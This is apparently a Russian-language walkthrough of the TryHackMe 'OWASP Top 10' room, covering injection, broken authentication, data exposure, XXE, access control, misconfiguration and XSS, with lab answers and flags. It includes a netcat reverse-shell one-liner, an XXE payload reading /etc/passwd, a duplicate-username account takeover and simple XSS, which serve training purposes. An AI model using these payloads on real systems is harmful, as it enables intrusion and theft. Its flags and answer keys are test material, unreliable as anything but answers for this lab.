[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [OWASP Top 10](https://tryhackme.com/r/room/owasptop10) 

Всего 31 задание:
## Задание 1
В этой комнате разбирается каждая тема OWASP и содержатся сведения о том, что такое уязвимость, как она возникает 
и как ее можно эксплуатировать. Вы примените теорию на практике, выполнив вспомогательные задания. 
- Инъекция
- Сломанная аутентификация
- Раскрытие конфиденциальных данных
- Внешний объект XML
- Неисправный контроль доступа
- Неправильная конфигурация безопасности
- Межсайтовый скриптинг
- Небезопасная десериализация
- Компоненты с известными уязвимостями
- Недостаточное ведение журнала и мониторинг


Комната рассчитана на новичков и не предполагает никаких предварительных знаний по безопасности.

### Ответить на вопросы ниже
Прочитайте вышеизложенное.
```commandline
Ответ не нужен
```

## Задание 2
Некоторые задачи потребуют от вас обучения на практике, часто путем взлома виртуальной машины.

Однако, чтобы получить доступ к этим машинам, вам необходимо либо:
- Подключайтесь с помощью OpenVPN
- Следуйте инструкциям здесь, чтобы подключиться с помощью OpenVPN.
- Используйте браузерную машину Linux
Если вы подписаны, разверните AttackBox в браузере, расположенный в правом верхнем углу! Более подробную информацию 
  можно найти здесь.
### Ответить на вопросы ниже
Подключитесь к нашей сети или разверните AttackBox.
```commandline
Ответ не нужен
```

## Задание 3
Ошибки инъекций очень распространены в современных приложениях. Эти ошибки возникают из-за того, что контролируемый 
пользователем ввод интерпретируется приложением как фактические команды или параметры. Атаки инъекций зависят от 
того, какие технологии используются и как именно эти технологии интерпретируют ввод. Вот некоторые распространенные 
примеры:
- SQL -инъекция: это происходит, когда контролируемый пользователем ввод передается в SQL- запросы. В результате 
злоумышленник может передавать SQL -запросы, чтобы манипулировать результатом таких запросов.  
- Command Injection : это происходит, когда пользовательский ввод передается системным командам. В результате 
злоумышленник может выполнять произвольные системные команды на серверах приложений. 

Если злоумышленнику удастся успешно передать входные данные, которые будут интерпретированы правильно, он сможет 
сделать следующее: 
- Доступ, изменение и удаление информации в базе данных, когда эти входные данные передаются в запросы к базе данных. 
Это означает, что злоумышленник может украсть конфиденциальную информацию, такую как личные данные и учетные данные. 
- Выполнять произвольные системные команды на сервере, которые позволят злоумышленнику получить доступ к системам 
пользователей. Это позволит им украсть конфиденциальные данные и провести больше атак на инфраструктуру, связанную с 
сервером, на котором выполняется команда.  

Основная защита для предотвращения атак инъекций — обеспечение того, чтобы контролируемый пользователем ввод не 
интерпретировался как запросы или команды. Есть разные способы сделать это: 
- Использование списка разрешенных: когда ввод отправляется на сервер, этот ввод сравнивается со списком безопасных 
вводов или символов. Если ввод отмечен как безопасный, то он обрабатывается. В противном случае он отклоняется, и 
приложение выдает ошибку.  
- Удаление входных данных: если входные данные содержат опасные символы, эти символы удаляются перед обработкой.

Опасные символы или ввод классифицируются как любой ввод, который может изменить способ обработки базовых данных. 
Вместо того, чтобы вручную составлять списки разрешений или даже просто удалять ввод, существуют различные 
библиотеки, которые выполняют эти действия за вас.  
### Ответить на вопросы ниже
Я понял, что такое инъекционные атаки.
```commandline
Ответ не нужен
```

## Задание 4
Внедрение команд происходит, когда серверный код (например, PHP) в веб-приложении выполняет системный вызов на 
хост-машине. Это веб-уязвимость, которая позволяет злоумышленнику воспользоваться этим выполненным системным вызовом 
для выполнения команд операционной системы на сервере. Иногда это не всегда заканчивается чем-то вредоносным, 
например,  whoami или просто чтением файлов. Это не так уж и плохо. Но особенность внедрения команд в том, что оно 
открывает множество возможностей для злоумышленника. Худшее, что они могут сделать, — это создать обратную оболочку, 
чтобы стать пользователем, от имени которого работает веб-сервер. Простой  ;nc -e /bin/bash — это все, что нужно, и 
они владеют вашим сервером;  некоторые варианты netcat не поддерживают опцию -e.  Вы можете использовать список  
этих  обратных оболочек в качестве альтернативы.

Как только злоумышленник закрепится на веб-сервере, он может начать обычный просмотр ваших систем и начать искать 
пути обхода. Теперь, когда мы знаем, что такое внедрение команд, мы начнем рассматривать различные типы и как их 
тестировать.

### Ответить на вопросы ниже
Я понял, что такое инъекция команд.
```commandline
Ответ не нужен
```

## Задание 5
### Что такое активная инъекция команд ?
Слепая инъекция команды происходит, когда системная команда, отправленная на сервер, не возвращает ответ 
пользователю в HTML-документе. Активная инъекция команды вернет ответ пользователю. Ее можно сделать видимой с 
помощью нескольких HTML-элементов.   

Давайте рассмотрим сценарий: EvilCorp начала разработку веб-оболочки, но случайно оставила ее открытой для Интернета.
Она еще далека от завершения, но содержит ту же уязвимость к инъекции команд, что и раньше! Но на этот раз ответ от 
системного вызова можно увидеть на странице! Они никогда не научатся!  

Как и прежде, давайте рассмотрим пример кода из evilshell.php и разберемся, что он делает и почему он делает его 
активным внедрением команды. Посмотрим, сможете ли вы разобраться. Я разберу его ниже, как и прежде. 

### Пример кода EvilShell (evilshell.php)

В псевдокоде приведенный выше фрагмент выполняет следующие действия:
1. Проверка того, установлен ли параметр «commandString»
2. Если это так, то переменная  $command_string получает то, что было передано в поле ввода
3. Затем программа переходит в блок try для выполнения функции  passthru($command_string). Вы можете прочитать 
   документацию на  passthru() веб  -сайте PHP , но в целом она выполняет то, что вводится во входные данные, а 
   затем передает выходные данные непосредственно обратно в браузер.  
4. Если попытка не удалась, вывести ошибку на страницу. Обычно это ничего не выводит, потому что вы не можете 
   вывести stderr, но PHP не позволяет вам выполнить попытку без catch. 

### Способы обнаружения активного внедрения команд

Мы знаем, что активная инъекция команд происходит, когда вы видите ответ от системного вызова. В приведенном выше 
коде функция  passthru() на самом деле выполняет всю работу. Она передает ответ непосредственно в документ, чтобы вы 
могли увидеть плоды своего труда прямо там. Поскольку мы это знаем, мы можем рассмотреть некоторые полезные команды, 
чтобы попытаться перечислить машину немного дальше. Вызов функции здесь  passthru() не всегда может быть тем, что 
происходит за кулисами, но я посчитал, что это самый простой и наименее сложный способ продемонстрировать уязвимость.

### Команды, которые нужно попробовать
Чтобы ответить на вопросы ниже, перейдите по адресу  http://MACHINE_IP/evilshell.php .

### Ответить на вопросы ниже
Что за странный текстовый файл находится в корневом каталоге сайта?

```commandline
drpepper.txt
```
Сколько существует пользователей без прав root/не служб/не демонов?
```commandline
0
```
От имени какого пользователя запущено это приложение?
```commandline
www-data
```
Какова настройка оболочки пользователя?
```commandline
/usr/sbin/nologin
```
Какая версия Ubuntu установлена?
```commandline
18.04.4
```
Распечатайте MOTD. Какой любимый напиток там указан?
```commandline
Dr Pepper
```
## Задание 6
Аутентификация и управление сеансами являются основными компонентами современных веб-приложений. Аутентификация 
позволяет пользователям получать доступ к веб-приложениям, проверяя свою личность. Наиболее распространенной формой 
аутентификации является использование механизма имени пользователя и пароля. Пользователь вводит эти учетные данные, 
сервер проверяет их. Если они верны, сервер затем предоставляет браузеру пользователя сеансовый cookie. Сеансовый 
cookie необходим, поскольку веб-серверы используют HTTP(S) для связи, которая не имеет состояния. Прикрепление 
сеансовых cookie означает, что сервер будет знать, кто отправляет какие данные. Затем сервер может отслеживать 
действия пользователей.

Если злоумышленник сможет найти недостатки в механизме аутентификации, он затем успешно получит доступ к учетным 
записям других пользователей. Это позволит злоумышленнику получить доступ к конфиденциальным данным (в зависимости 
от цели приложения). Некоторые распространенные недостатки в механизмах аутентификации включают:
- Атаки методом подбора: если веб-приложение использует имена пользователей и пароли, злоумышленник может запустить 
  атаки методом подбора, которые позволят ему угадать имя пользователя и пароли, используя несколько попыток 
  аутентификации.   
- Использование слабых учетных данных: веб-приложения должны устанавливать надежные политики паролей. Если приложения 
  позволяют пользователям устанавливать пароли, такие как «password1» или общие пароли, то злоумышленник может легко 
  угадать их и получить доступ к учетным записям пользователей. Они могут сделать это без перебора и без нескольких 
  попыток.
- Слабые сеансовые куки: сеансовые куки — это то, как сервер отслеживает пользователей. Если сеансовые куки содержат 
  предсказуемые значения, злоумышленник может установить свои собственные сеансовые куки и получить доступ к учетным 
  записям пользователей.


В зависимости от конкретной уязвимости могут быть предусмотрены различные способы смягчения последствий взлома механизмов аутентификации:
- Чтобы избежать атак с подбором пароля, убедитесь, что приложение применяет надежную политику паролей. 
- Чтобы избежать атак методом подбора пароля, убедитесь, что приложение автоматически блокирует пароль после 
  определенного количества попыток. Это не позволит злоумышленнику проводить больше атак методом подбора пароля.
- Реализуйте многофакторную аутентификацию. Если у пользователя есть несколько методов аутентификации, например, 
  использование имени пользователя и пароля, а также получение кода на мобильное устройство, то злоумышленнику будет 
  сложно получить доступ к обеим учетным данным, чтобы получить доступ к его учетной записи.  
### Ответить на вопросы ниже
Я понял, как работают сломанные механизмы аутентификации.
```commandline
Ответ не нужен
```

## Задание 7
В этом примере мы рассмотрим логическую ошибку в механизме аутентификации.
Очень часто случается так, что разработчики забывают санировать вводимые пользователем данные (имя пользователя и 
пароль) в коде своего приложения, что может сделать их уязвимыми для атак типа SQL-инъекции. Однако мы 
сосредоточимся на уязвимости, которая возникает из-за ошибки разработчика, но которую очень легко эксплуатировать, 
то есть повторная регистрация существующего пользователя.

Давайте разберем это на примере. Допустим, есть существующий пользователь с именем  admin  , и теперь мы хотим 
получить доступ к его учетной записи, поэтому мы можем попытаться перерегистрировать это имя пользователя, но с 
небольшим изменением. Мы собираемся ввести «admin» (обратите внимание на пробел в начале). Теперь, когда вы вводите 
это в поле имени пользователя и вводите другую необходимую информацию, такую как адрес электронной почты или 
пароль, и отправляете эти данные. Фактически это зарегистрирует нового пользователя, но этот пользователь будет 
иметь те же права, что и обычный администратор. Этот новый пользователь также сможет видеть весь контент, 
представленный под пользователем admin.      

Чтобы увидеть это в действии, перейдите по адресу http://MACHINE_IP: 8888 и попробуйте зарегистрировать имя 
пользователя darren. Вы увидите, что такой пользователь уже существует. Попробуйте зарегистрировать пользователя  
«darren». Вы увидите, что теперь вы вошли в систему и сможете видеть контент, присутствующий только в учетной 
записи Даррена, что в нашем случае является флагом, который вам нужно получить.

### Ответить на вопросы ниже
Какой флаг вы нашли в аккаунте Даррена?
```commandline
fe86079416a21a3c99937fea8874b667
```
Теперь попробуйте проделать тот же трюк и посмотрите, сможете ли вы войти как  arthur.
```commandline
Ответ не нужен
```
Что за флаг вы нашли в аккаунте Артура?
```commandline
d9ac0f7db4fda460ac3edeb75d75e16e
```

## Задание 8
Когда веб-приложение случайно раскрывает конфиденциальные данные, мы называем это «разглашением конфиденциальных 
данных». Часто это данные, напрямую связанные с клиентами (например, имена, даты рождения, финансовая информация и т.
д.), но также может быть более техническая информация, такая как имена пользователей и пароли. На более сложных 
уровнях это часто включает такие методы, как «атака посредника», когда злоумышленник принудительно устанавливает 
соединения пользователей через устройство, которое он контролирует, а затем использует слабое шифрование любых 
передаваемых данных, чтобы получить доступ к перехваченной информации (если данные вообще зашифрованы...). Конечно, 
многие примеры намного проще, и уязвимости можно найти в веб-приложениях, которые можно эксплуатировать без 
каких-либо продвинутых знаний в области сетей. Действительно, в некоторых случаях конфиденциальные данные можно 
найти непосредственно на самом веб-сервере...

Веб-приложение в этом ящике содержит одну такую уязвимость. Разверните машину, затем прочитайте вспомогательный 
материал в следующих задачах, пока ящик загружается. 

### Ответить на вопросы ниже
Прочитайте введение в раздел «Раскрытие конфиденциальных данных» и разверните машину.
```commandline
Ответ не нужен
```

## Задание 9
Наиболее распространенный способ хранения большого объема данных в формате, который легко доступен из многих мест 
одновременно, — это база данных. Очевидно, что это идеально подходит для чего-то вроде веб-приложения, поскольку с 
веб-сайтом может одновременно взаимодействовать множество пользователей. Движки баз данных обычно следуют синтаксису 
языка  структурированных запросов ( SQL  ) ; однако альтернативные форматы (такие как NoSQL) становятся все более 
популярными. 

В производственной среде часто можно увидеть базы данных, настроенные на выделенных серверах, на которых запущена 
служба базы данных, например MySQL или MariaDB; однако базы данных также могут храниться в виде файлов. Эти базы 
данных называются базами данных «плоских файлов», поскольку они хранятся в виде одного файла на компьютере. Это 
намного проще, чем настройка полного сервера базы данных, и поэтому потенциально может быть замечено в небольших 
веб-приложениях. Доступ к серверу базы данных выходит за рамки сегодняшней задачи, поэтому давайте вместо этого 
сосредоточимся на базах данных «плоских файлов».     

Как упоминалось ранее, базы данных с плоскими файлами хранятся в виде файла на диске компьютера. Обычно это не будет 
проблемой для веб-приложения, но что произойдет, если база данных будет храниться в корневом каталоге веб-сайта (т. 
е. в одном из файлов, к которым может получить доступ пользователь, подключающийся к веб-сайту)? Ну, мы можем 
загрузить ее и запросить на нашей собственной машине, имея полный доступ ко всему в базе данных. Действительно, 
раскрытие конфиденциальных данных!    

Это важный намек на задачу, поэтому давайте кратко рассмотрим синтаксис, который мы будем использовать для запросов 
к базе данных с плоскими файлами. 

Наиболее распространенный (и самый простой) формат базы данных flat-file — это  база данных sqlite  . С ними можно 
взаимодействовать на большинстве языков программирования, и у них есть специальный клиент для запросов к ним в 
командной строке. Этот клиент называется " sqlite3 " и устанавливается по умолчанию в Kali.  

Предположим, нам удалось успешно загрузить базу данных:
Мы видим, что в текущей папке находится база данных SQLite.

Для доступа к нему мы используем:  sqlite3 <database-name>:
Отсюда мы можем просмотреть таблицы в базе данных с помощью  .tables команды:
На этом этапе мы можем выгрузить все данные из таблицы, но мы не обязательно узнаем, что означает каждый столбец, 
пока не посмотрим на информацию в таблице. Сначала давайте используем ,  PRAGMA table_info(customers); чтобы увидеть 
информацию в таблице, затем мы используем ,  SELECT * FROM customers; чтобы выгрузить информацию из таблицы:  

Из информации в таблице видно, что есть четыре столбца: custID, custName, creditCard и password. Вы можете заметить, 
что это совпадает с результатами. Возьмем первую строку: 

`0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99`
 
У нас есть custID (0), custName (Джой Полсон), кредитная карта (4916 9012 2231 7905) и хэш пароля 
(5f4dcc3b5aa765d61d8327deb882cf99). 

В следующем задании мы рассмотрим взлом этого хеша.

### Ответить на вопросы ниже
Прочитайте и изучите вспомогательные материалы по базам данных SQLite.
```commandline
Ответ не нужен
```

## Задание 10
В предыдущей задаче мы увидели, как запросить базу данных SQLite для получения конфиденциальных данных. Мы нашли 
коллекцию хэшей паролей, по одному для каждого пользователя. В этой задаче мы кратко рассмотрим, как их взломать.

Что касается взлома хэшей, в Kali уже предустановлены различные инструменты — если вы знаете, как ими пользоваться, 
смело пользуйтесь; однако их рассмотрение выходит за рамки данного материала.

Вместо этого мы будем использовать онлайн-инструмент:  Crackstation . Этот веб-сайт очень хорош для взлома слабых 
хэшей паролей. Для более сложных хэшей нам понадобятся более сложные инструменты; однако, все взламываемые хэши 
паролей, используемые в сегодняшнем испытании, являются слабыми хэшами MD5 , с которыми Crackstation должен 
справиться очень хорошо.   

При переходе на сайт мы видим следующий интерфейс:
Давайте попробуем вставить хеш пароля для Джой Полсон, который мы нашли в предыдущем задании ( 
5f4dcc3b5aa765d61d8327deb882cf99). Решаем капчу, затем нажимаем кнопку «Взломать хеш-коды»: 
Мы видим, что хеш был успешно взломан, и что пароль пользователя был «password» — как безопасно!
Стоит отметить, что Crackstation работает с использованием огромного списка слов. Если пароль отсутствует в списке слов, то Crackstation не сможет взломать хэш.
Испытание управляемое, поэтому если Crackstation не сможет взломать хеш в сегодняшнем боксе, можно предположить, что хеш был специально разработан таким образом, чтобы его нельзя было взломать.

### Ответить на вопросы ниже
Прочитайте вспомогательные материалы о взломе хэшей.
```commandline
Ответ не нужен
```
## Задание 11
Пришло время применить полученные знания на практике!

### Ответить на вопросы ниже
Посмотрите вокруг веб-приложения. Разработчик оставил себе заметку, указывающую, что в определенном каталоге есть конфиденциальные данные. 

Как называется упомянутый каталог?
```commandline
/assets
```
Перейдите в каталог, который вы нашли в вопросе 1. Какой файл выделяется как файл, который, скорее всего, содержит 
конфиденциальные данные? 
```commandline
webapp.db
```
Используйте вспомогательные материалы для доступа к конфиденциальным данным. Каков хэш пароля пользователя admin?
```commandline
6eea9b7ef19179a06954edd0f6c05ceb
```
Взломать хэш.
Какой открытый пароль администратора?
```commandline
qwertyuiop
```
Войдите как администратор. Что такое флаг?
```commandline
THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}
```

## Задание 12
Атака XML External Entity (XXE) — это уязвимость, которая злоупотребляет функциями парсеров/данных XML . Она часто 
позволяет злоумышленнику взаимодействовать с любыми внутренними или внешними системами , к которым само приложение 
может получить доступ, и может позволить злоумышленнику прочитать файл в этой системе. Они также могут вызвать атаку 
типа «отказ в обслуживании» ( DoS ) или использовать XXE для выполнения подделки запросов на стороне сервера (SSRF), 
заставляя веб-приложение отправлять запросы другим приложениям. XXE может даже включить сканирование портов и 
привести к удаленному выполнению кода. Существует два типа атак XXE : внутриполосные и внеполосные (OOB- XXE ). 1) 
Внутриполосная атака XXE — это атака, при которой злоумышленник может получить немедленный ответ на полезную 
нагрузку XXE.

2) внеполосные атаки XXE (также называемые слепыми атаками XXE ), при которых не происходит немедленного ответа от 
   веб-приложения, и злоумышленнику приходится отражать вывод своей полезной нагрузки XXE в каком-либо другом файле 
   или на своем собственном сервере.  

Этот челлендж доступен только нашим подписчикам — удачного взлома!

### Ответить на вопросы ниже
Разверните машину, прикрепленную к заданию.
```commandline
Ответ не нужен
```

## Задание 13
Прежде чем перейти к изучению эксплуатации XXE, нам нужно будет как следует разобраться в XML.

Что такое XML ?

XML (eXtensible Markup Language) — это язык разметки, который определяет набор правил для кодирования документов в 
формате, который может быть как читаем человеком, так и читаем машиной. Это язык разметки, используемый для хранения 
и передачи данных.   

### Почему мы используем XML ?
1. XML не зависит от платформы и языка программирования, поэтому его можно использовать в любой системе, и он 
   поддерживает изменение технологий, когда это происходит.  
2. Данные, хранящиеся и передаваемые с помощью XML, могут быть изменены в любой момент времени, не влияя на 
   представление данных. 
3. XML допускает проверку с использованием DTD и схемы. Эта проверка гарантирует, что документ XML не содержит 
   синтаксических ошибок. 
4. XML упрощает обмен данными между различными системами из-за своей платформенно-независимой природы. Данные XML не 
   требуют преобразования при передаче между различными системами. 

### Синтаксис

Каждый документ XML в основном начинается с того, что известно как XML Prolog.
`<?xml version="1.0" encoding="UTF-8"?>`

Над строкой находится XML- пролог, который определяет версию XML и кодировку, используемые в XML- документе. Эта 
строка не является обязательной для использования, но считается `хорошей практикой` помещать ее во все ваши XML- 
документы.  

Каждый XML- документ должен содержать элемент `ROOT`. Например:
```commandline
<?xml version="1.0" encoding="UTF-8"?>
<mail>
   <to>falcon</to>
   <from>feast</from>
   <subject>About XXE</subject>
   <text>Teach about XXE</text>
</mail>
```

В приведенном выше примере  <mail> является корневым элементом этого документа, а  <to>,  <from>,  <subject>,  
<text> являются дочерними элементами. Если документ XML не имеет корневого элемента, то он будет считаться wrong или 
invalid XML doc.  

Еще одна вещь, которую следует помнить, это то, что XML является чувствительным к регистру языком. Если тег 
начинается как ,  <to> то он должен заканчиваться на  </to> , а не на что-то вроде  </To>(обратите внимание на 
заглавные буквы  T).  

Как и в HTML, мы также можем использовать атрибуты в XML . Синтаксис для наличия атрибутов также очень похож на HTML.
Например: 
<text category = "message">You need to learn about XXE</text>

В приведенном выше примере category — имя атрибута, message — значение атрибута.

### Ответить на вопросы ниже
Полная форма XML
```commandline
Extensible Markup Language
```
Обязательно ли наличие XML-пролога в XML-документах?
```commandline
no
```
Можно ли проверить XML-документы на соответствие схеме?
```commandline
yes
```
Как указать версию и кодировку XML в XML-документе?
```commandline
XML prolog
```

## Задание 14
Прежде чем перейти к изучению XXE, нам необходимо понять, что такое DTD в XML .

DTD означает Document Type Definition (Определение типа документа). DTD определяет структуру, а также юридические 
элементы и атрибуты XML- документа. 

Давайте попробуем понять это на примере. Допустим, у нас есть файл с именем  note.dtd и следующим содержимым:

<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT 
heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]> 

Теперь мы можем использовать этот DTD для проверки информации некоторого XML- документа и убедиться, что XML- файл 
соответствует правилам этого DTD. 
Пример: Ниже приведен XML-документ, который использует note.dtd
```commandline
< ?xml  версия ="1.0"  кодировка ="UTF-8" ? >
< !DOCTYPE  примечание СИСТЕМА "note.dtd" >
< примечание >
    < к > сокол < / к >
    < от > пир < / от >
    < заголовок > взлом < / заголовок >
    < тело > атака XXE < / тело >
< / примечание >
```
Итак, теперь давайте разберемся, как этот DTD проверяет XML. Вот что  note.dtd означают все эти термины, используемые в
```commandline
!DOCTYPE note — определяет корневой элемент документа с именем  note.
!ELEMENT note - Определяет, что элемент заметки должен содержать элементы: «кому, от, заголовок, тело»
!ELEMENT to — определяет  to элемент как имеющий тип "#PCDATA"
!ELEMENT from - Определяет  from элемент как имеющий тип "#PCDATA"
!Заголовок ELEMENT — определяет  heading элемент как имеющий тип "#PCDATA"
!ELEMENT body — определяет body элемент как имеющий тип "#PCDATA"
    ПРИМЕЧАНИЕ : #PCDATA означает анализируемые символьные данные.
```
### Ответить на вопросы ниже
Как вы определяете новый ЭЛЕМЕНТ?
```commandline
!ELEMENT
```
Как определить элемент ROOT?
```commandline
!DOCTYPE
```
Как вы определяете новую СУБЪЕКТ?
```commandline
!ENTITY
```

## Задание 15
Теперь мы рассмотрим некоторые полезные данные XXE и посмотрим, как они работают.

1) Первая полезная нагрузка, которую мы увидим, очень проста. Если вы внимательно прочитали предыдущее задание, то 
   вы очень легко поймете эту полезную нагрузку. 
```commandline
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>
```
Как мы видим, мы определяем  ENTITY вызываемый объект  name и присваиваем ему значение feast. Позже мы используем 
эту СУЩНОСТЬ в нашем коде. 

2) Мы также можем использовать XXE для чтения некоторого файла из системы, определив ENTITY и заставив его 
   использовать ключевое слово SYSTEM. Здесь мы снова определяем ENTITY с именем, но разница в том, что мы 
   устанавливаем его значение на `SYSTEM` и путь к файлу. Если мы используем эту полезную нагрузку, то веб-сайт, 
   уязвимый для XXE (обычно), отобразит содержимое файла.


```commandline
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>

read

/etc/passwd
```
Аналогичным образом мы можем использовать этот тип полезной нагрузки для чтения других файлов, но во многих случаях 
чтение файлов таким образом может завершиться неудачей, или причиной сбоя может быть файл, который вы пытаетесь 
прочитать.  

### Ответить на вопросы ниже
Попробуйте полезную нагрузку, указанную в описании на сайте.
```commandline
Ответ не нужен
```
## Задание 16
Теперь давайте посмотрим на некоторые полезные нагрузки в действии. Полезная нагрузка, которую я буду использовать, 
это та, которую мы видели в предыдущем задании. 
1) Давайте посмотрим, как будет выглядеть сайт, если мы попробуем использовать полезную нагрузку для отображения имени.
С левой стороны мы видим запрос burp, который был отправлен с полезной нагрузкой, закодированной в URL, а с правой 
   стороны мы видим, что полезная нагрузка смогла успешно отобразить имя falcon feast 
2) Теперь давайте попробуем прочитать /etc/passwd

### Ответить на вопросы ниже
Попробуйте отобразить свое имя с помощью любой полезной нагрузки.
```commandline
Ответ не нужен
```
Посмотрите, сможете ли вы прочитать /etc/passwd
```commandline
Ответ не нужен
```
Какое имя пользователя в /etc/passwd?
```commandline
falcon
```
Где находится SSH-ключ Falcon?
```commandline
/home/falcon/.ssh/id_rsa
```
Каковы первые 18 символов закрытого ключа Falcon?
```commandline
MIIEogIBAAKCAQEA7
```

## Задание 17

Веб-сайты имеют страницы, которые защищены от обычных посетителей, например, только администратор сайта должен иметь 
доступ к странице для управления другими пользователями. Если посетитель веб-сайта может получить доступ к 
защищенной странице/страницам, которые он не имеет права просматривать, контроль доступа нарушен.

Доступ обычного посетителя к защищенным страницам может привести к следующему:
- Возможность просмотра конфиденциальной информации
- Доступ к несанкционированным функциям


OWASP перечислил несколько сценариев атак, демонстрирующих уязвимости контроля доступа:
- Сценарий №1:  Приложение использует непроверенные данные в вызове SQL , который обращается к информации об учетной записи:
`pstmt.setString(1, request.getParameter("acct"));`
Результаты ResultSet = pstmt.executeQuery();

Злоумышленник просто изменяет параметр 'acct' в браузере, чтобы отправить любой желаемый им номер счета. Если не 
провести надлежащую проверку, злоумышленник может получить доступ к аккаунту любого пользователя. 
http://example.com/app/accountInfo?acct=notmyacct

Сценарий №2:  Злоумышленник просто заставляет браузеры переходить по целевым URL-адресам. Для доступа к странице 
администратора требуются права администратора. 
http://example.com/app/getappInfo
http://example.com/app/admin_getappInfo

Если неаутентифицированный пользователь может получить доступ к любой из страниц, это недостаток. Если 
неадминистратор может получить доступ к странице администратора, это недостаток ( ссылка на сценарии ). 

Проще говоря, нарушение контроля доступа позволяет злоумышленникам обходить авторизацию, что позволяет им 
просматривать конфиденциальные данные или выполнять задачи, как если бы они были привилегированным пользователем. 
### Ответить на вопросы ниже
Прочитайте и поймите, как работает неисправный контроль доступа.
```commandline
Ответ не нужен
```

## Задание 18
IDOR (Insecure Direct Object Reference) — это действие по использованию неправильной конфигурации способа обработки 
пользовательского ввода для доступа к ресурсам, к которым вы обычно не можете получить доступ. IDOR — это тип 
уязвимости контроля доступа.

Например, предположим, что мы входим в свой банковский счет и после правильной аутентификации попадаем на URL-адрес 
вроде https://example.com/bank?account_number=1234 . На этой странице мы можем видеть все важные банковские 
реквизиты, и пользователь может сделать все, что ему нужно, и продолжить свой путь, думая, что все в порядке.

Однако здесь есть потенциально огромная проблема: хакер может изменить параметр account_number на что-то другое, 
например, 1235, и если сайт настроен неправильно, то он получит доступ к чужой банковской информации. 
### Ответить на вопросы ниже
Прочитайте и поймите, как работает IDOR.
```commandline
Ответ не нужен
```
Разверните машину и перейдите по адресу http://MACHINE_IP - Войдите в систему, используя имя пользователя noot и 
пароль test1234. 
```commandline
Ответ не нужен
```
Посмотрите заметки других пользователей. Что такое флаг?
```commandline
flag{fivefourthree}
```

## Задание 19
### Неправильная конфигурация безопасности
Ошибки в настройке безопасности отличаются от других 10 основных уязвимостей, поскольку они возникают в случаях, 
когда безопасность можно было настроить правильно, но этого не произошло. 

К неправильным настройкам безопасности относятся:

Плохо настроенные разрешения для облачных сервисов, таких как S3- корзины
Наличие ненужных включенных функций, таких как службы, страницы, учетные записи или привилегии
Учетные записи по умолчанию с неизмененными паролями
Сообщения об ошибках слишком подробны и позволяют злоумышленнику узнать больше о системе.
Неиспользование заголовков безопасности HTTP или раскрытие слишком большого количества деталей в заголовке HTTP Server:
Эта уязвимость часто может привести к появлению других уязвимостей, таких как учетные данные по умолчанию, дающие 
вам доступ к конфиденциальным данным, XXE или внедрению команд на страницах администратора. 

Для получения дополнительной информации я рекомендую ознакомиться с десяткой лучших ошибок конфигурации безопасности 
по версии OWASP. 

### Пароли по умолчанию
В частности, эта виртуальная машина фокусируется на паролях по умолчанию. Это конкретный пример неправильной 
конфигурации безопасности. Вы можете и должны изменить любые пароли по умолчанию, но люди часто этого не делают. 

Это особенно распространено среди встраиваемых устройств и устройств Интернета вещей, и в большинстве случаев 
владельцы не меняют эти пароли. 

Легко представить себе риск учетных данных по умолчанию с точки зрения злоумышленника. Возможность получить доступ к 
панелям администратора, службам, разработанным для системных администраторов или производителей, или даже к сетевой 
инфраструктуре может быть невероятно полезной при атаке на бизнес. От раскрытия данных до легкого RCE , последствия 
учетных данных по умолчанию могут быть серьезными.   

В октябре 2016 года Dyn ( провайдер DNS ) был выведен из строя одной из самых памятных DDoS- атак за последние 10 
лет. Поток трафика в основном исходил от Интернета вещей и сетевых устройств, таких как маршрутизаторы и модемы, 
зараженных вредоносным ПО Mirai.  

Как вредоносное ПО захватило системы? Пароли по умолчанию. Вредоносное ПО имело список из 63 пар имя 
пользователя/пароль и пыталось войти в открытые службы telnet. 

DDoS - атака была примечательна тем, что отключила множество крупных веб-сайтов и сервисов. Amazon, Twitter, Netflix,
GitHub, Xbox Live, PlayStation Network и многие другие сервисы отключились на несколько часов в результате трех волн 
DDoS -атак на Dyn.  

### Практический пример
Эта виртуальная машина демонстрирует Security Misconfiguration, как часть списка 10 самых уязвимых мест OWASP .

Разверните виртуальную машину и взломайте ее, используя неверную конфигурацию безопасности!

### Ответить на вопросы ниже
Развертывание виртуальной машины
```commandline
Ответ не нужен
```
Взломайте веб-приложение и найдите флаг!
```commandline
thm{4b9513968fd564a87b28aa1f9d672e17}
```

## Задание 20
### Объяснение XSS
Межсайтовый скриптинг, также известный как XSS, — это уязвимость безопасности, обычно встречающаяся в 
веб-приложениях. Это тип инъекции, который может позволить злоумышленнику выполнить вредоносные скрипты и заставить 
их выполниться на машине жертвы.  

Веб-приложение уязвимо для XSS , если оно использует несанкционированный пользовательский ввод. XSS возможен в 
Javascript, VBScript, Flash и CSS. Существует три основных типа межсайтового скриптинга: 
- Сохраненный XSS  — самый опасный тип XSS. Это когда вредоносная строка берется из базы данных веб-сайта. Это часто 
случается, когда веб-сайт допускает ввод данных пользователем, который не был очищен (удалены «плохие части» ввода 
  пользователя) при вставке в базу данных. 
- Отраженный XSS  — вредоносная полезная нагрузка является частью запроса жертвы к веб-сайту. Веб-сайт включает эту 
  полезную нагрузку в ответ пользователю. Подводя итог, злоумышленнику нужно обманом заставить жертву щелкнуть 
  URL-адрес, чтобы выполнить свою вредоносную полезную нагрузку. 
- DOM-Based XSS  - DOM означает Document Object Model и является программным интерфейсом для документов HTML и XML . 
  Он представляет страницу, чтобы программы могли изменять структуру документа, стиль и содержимое. Веб-страница - 
  это документ, и этот документ может быть отображен в окне браузера или как исходный HTML. 
Для получения дополнительных объяснений и упражнений по XSS посетите комнату XSS.

### Полезные нагрузки XSS
Помните, что межсайтовый скриптинг — это уязвимость, которую можно использовать для выполнения вредоносного 
Javascript на машине жертвы. Ознакомьтесь с некоторыми распространенными типами используемых полезных нагрузок: 

Всплывающие окна (<script>alert(“Hello World”)</script>) — создают всплывающее сообщение Hello World в браузере 
пользователя. 
